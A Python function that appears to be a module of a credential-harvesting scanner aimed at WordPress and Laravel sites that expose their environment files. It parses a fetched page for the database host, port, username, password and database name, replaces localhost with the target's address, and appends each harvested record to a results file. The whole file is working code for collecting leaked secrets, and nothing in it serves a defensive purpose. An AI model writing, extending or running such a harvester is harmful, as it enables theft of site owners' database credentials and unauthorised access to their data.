import re


def laravel_wordpress(page, star):
    method = "/WORDRESS_ENV"
    try:
        if "WP_ENV=" in page:
            if "DB_NAME=" in page:
                try:
                    url = re.findall("WP_HOME=(.*)\n", str(page))[0]
                    if "localhost" in url:
                        url = star
                    elif "127.0.0.1" in url:
                        url = star
                except:
                    url = star
                try:
                    db_host = re.findall("DB_HOST=(.*)\n", str(page))[0]
                    if "localhost" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    elif "127.0.0.1" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                except:
                    db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                try:
                    db_port = re.findall("DB_PORT=(.*)\n", str(page))[0]
                    if db_port == "null":
                        db_port = "3306"
                    else:
                        db_port = db_port
                except:
                    db_port = "3306"
                try:
                    db_connection = re.findall("DB_CONNECTION=(.*)\n", str(page))[0]
                except:
                    db_connection = 'mysql'
                try:
                    db_username = re.findall("DB_USER=(.*)\n", str(page))[0]
                except:
                    db_username = ''
                try:
                    db_password = re.findall("DB_PASSWORD=(.*)\n", str(page))[0]
                except:
                    db_password = ''
                try:
                    db_database = re.findall("DB_NAME=(.*)\n", str(page))[0]
                except:
                    db_database = ''
                build = 'URL: ' + str(url) + '\nMETHOD: ' + "/WORDPRESS_ENV" + '\nDB_CONNECTION: ' + str(
                    db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                    db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                    db_username) + '\nDB_PASSWORD: ' + str(db_password)
                remover = str(build).replace('\r', '')
                save = open('Results/DATABASE.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
            else:
                return False
    except Exception as e:
        return False
